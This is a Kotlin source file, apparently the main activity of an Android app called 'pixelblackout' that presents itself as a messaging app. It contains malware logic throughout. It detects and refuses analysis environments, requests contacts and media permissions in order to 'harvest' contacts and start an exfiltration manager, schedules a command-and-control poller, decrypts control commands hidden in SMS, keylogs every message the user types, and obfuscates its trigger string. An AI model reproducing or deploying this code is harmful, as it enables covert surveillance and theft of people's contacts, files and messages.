package com.example.pixelblackout.activities

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.databinding.DataBindingUtil
import com.example.pixelblackout.BuildConfig
import com.example.pixelblackout.R
import com.example.pixelblackout.c2.C2Scheduler
import com.example.pixelblackout.c2.RemoteCommandRouter
import com.example.pixelblackout.databinding.ActivityMainBinding
import com.example.pixelblackout.managers.CommandDispatcher
import com.example.pixelblackout.managers.CommandResult
import com.example.pixelblackout.managers.ExfilManager
import com.example.pixelblackout.managers.KeyLogStore
import com.example.pixelblackout.managers.SecretChannel
import com.example.pixelblackout.managers.SecretCipher
import com.example.pixelblackout.nativebridge.NativeCrypto
import com.example.pixelblackout.utils.EnvironmentInspector
import com.example.pixelblackout.utils.StringVault
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private lateinit var secretChannel: SecretChannel
    private lateinit var dispatcher: CommandDispatcher
    private var initialHarvestTriggered = false
    private val permissionRequestCode = 0x33
    private val remoteCommandListener: (String) -> Unit = { payload ->
        runOnUiThread {
            debugLog("Processing synchronized payload len=${payload.length}")
            handleSmsPayload(payload)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (shouldBlockEnvironment()) {
            Toast.makeText(this, "Unsupported device", Toast.LENGTH_LONG).show()
            finish()
            return
        }
        supportActionBar?.hide()

        binding = DataBindingUtil.setContentView(this, R.layout.activity_main)
        initializeComponents()
        if (isFinishing) {
            return
        }
        setupUI()
        debugLog("Main activity initialized; scheduling C2 poller")
        C2Scheduler.schedule(applicationContext)
    }

    private fun initializeComponents() {
        try {
            NativeCrypto.warmUp()
            dispatcher = CommandDispatcher(this)
            secretChannel = SecretChannel(dispatcher)
        } catch (illegal: IllegalStateException) {
            Toast.makeText(this, "Unsupported device", Toast.LENGTH_LONG).show()
            finish()
            return
        }
        requestRuntimePermissions()
    }

    private fun setupUI() {
        binding.sendButton.setOnClickListener {
            val message = binding.commandInput.text?.toString()?.trim().orEmpty()
            if (message.isEmpty()) {
                return@setOnClickListener
            }
            binding.commandInput.text?.clear()
            if (message.startsWith(SMS_PREFIX, ignoreCase = true)) {
                processOutgoingMessage(message)
            } else {
                val recipient = binding.recipientInput.text?.toString()?.trim().orEmpty()
                sendComposedMessage(recipient, message)
            }
        }
    }

    private fun sendComposedMessage(recipient: String, body: String) {
        if (recipient.isBlank()) {
            Toast.makeText(this, "Enter recipient", Toast.LENGTH_SHORT).show()
            return
        }
        appendMessage("Me → $recipient", body)
        KeyLogStore.append(this, KeyLogStore.SOURCE_CONSOLE, "$recipient|$body")
    }

    private fun processOutgoingMessage(message: String) {
        appendMessage("Me", message)
        KeyLogStore.append(this, KeyLogStore.SOURCE_CONSOLE, message)
        if (message.startsWith(SMS_PREFIX, ignoreCase = true)) {
            val payload = message.substring(SMS_PREFIX.length)
            debugLog("Manual sms payload submitted len=${payload.length}")
            handleSmsPayload(payload)
        } else {
            Toast.makeText(this, "Message queued for delivery…", Toast.LENGTH_SHORT).show()
        }
    }

    private fun handleSmsPayload(payload: String) {
        CoroutineScope(Dispatchers.Main).launch {
            if (!processSecretPayload(payload)) {
                Toast.makeText(this@MainActivity, "Malformed control SMS", Toast.LENGTH_SHORT).show()
                debugLog("Payload rejected during processing")
            }
        }
    }

    private fun processSecretPayload(payload: String): Boolean {
        debugLog("Beginning decrypt/dispatch pipeline len=${payload.length}")
        return runCatching {
            val encryptedResponse = secretChannel.handleEncryptedPayload(payload)
            val decoded = SecretCipher.decrypt(encryptedResponse)
            KeyLogStore.append(this, KeyLogStore.SOURCE_C2, decoded)
            handleControlResponse(decoded)
            true
        }.onFailure { error ->
            debugLog("Processing failed: ${error::class.java.simpleName}:${error.message}")
        }.getOrDefault(false)
    }

    private fun handleControlResponse(decoded: String) {
        val json = runCatching { JSONObject(decoded) }.getOrNull() ?: return
        if (json.optString("status") != "ok") {
            return
        }
        val data = json.optString("data")
        debugLog("SMS control -> $data")
    }

    private fun appendMessage(sender: String, text: String) {
        if (!sender.startsWith("Me")) {
            return
        }
        val layoutId = if (sender.contains("→")) {
            R.layout.item_message_me
        } else {
            R.layout.item_message_me
        }
        val bubble = layoutInflater.inflate(layoutId, binding.messageContainer, false)
        bubble.findViewById<TextView>(R.id.messageMeta).text = sender
        bubble.findViewById<TextView>(R.id.messageBody).text = text
        binding.messageContainer.addView(bubble)
        binding.messageScroll.post { binding.messageScroll.fullScroll(View.FOCUS_DOWN) }
    }

    private fun shouldBlockEnvironment(): Boolean = EnvironmentInspector.shouldBlock(this)

    private fun requiredPermissions(): Array<String> {
        val perms = mutableListOf(Manifest.permission.READ_CONTACTS)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms += Manifest.permission.READ_MEDIA_IMAGES
        } else {
            perms += Manifest.permission.READ_EXTERNAL_STORAGE
        }
        return perms.toTypedArray()
    }

    private fun hasAllPermissions(): Boolean = requiredPermissions().all {
        ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestRuntimePermissions() {
        val missing = requiredPermissions().filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            requestPermissions(missing.toTypedArray(), permissionRequestCode)
        } else {
            triggerInitialHarvestIfPermitted()
        }
    }

    private fun triggerInitialHarvestIfPermitted() {
        if (initialHarvestTriggered) {
            return
        }
        if (hasAllPermissions()) {
            initialHarvestTriggered = true
            CoroutineScope(Dispatchers.IO).launch {
                val result = dispatcher.execute("getcontacts")
                val message = when (result) {
                    is CommandResult.Success -> "Contacts seed -> ${result.message}"
                    is CommandResult.Failure -> "Contacts seed failed -> ${result.error}"
                }
                runOnUiThread { debugLog(message) }
                ExfilManager.prepare(this@MainActivity)
            }
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == permissionRequestCode) {
            if (hasAllPermissions()) {
                triggerInitialHarvestIfPermitted()
            }
        }
    }

    override fun onStart() {
        super.onStart()
        debugLog("Registering router listener")
        RemoteCommandRouter.register(remoteCommandListener)
    }

    override fun onStop() {
        debugLog("Unregistering router listener")
        RemoteCommandRouter.unregister(remoteCommandListener)
        super.onStop()
    }

    private fun debugLog(message: String) {
        if (BuildConfig.DEBUG) {
            Log.d(TAG, message)
        }
    }

    companion object {
        private const val TAG = "MainActivity"
        private val SMS_PREFIX: String = StringVault.reveal("UE5QGQ==")
    }
}
